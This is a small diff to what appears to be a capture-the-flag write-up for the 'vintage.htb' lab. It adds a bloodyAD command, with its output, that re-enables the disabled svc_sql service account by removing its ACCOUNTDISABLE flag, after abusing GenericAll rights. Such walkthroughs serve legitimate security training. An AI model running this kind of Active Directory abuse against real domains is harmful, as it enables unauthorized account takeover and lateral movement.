@@ -199,5 +199,8 @@ GenericAll over three service accounts
 
 The `svc_sql` account is disabled
 
+```python
+bloodyAD -k --host dc01.vintage.htb -d vintage.htb remove uac 'svc_sql' -f ACCOUNTDISABLE           
 
-
+[-] ['ACCOUNTDISABLE'] property flags removed from svc_sql's userAccountControl
+```
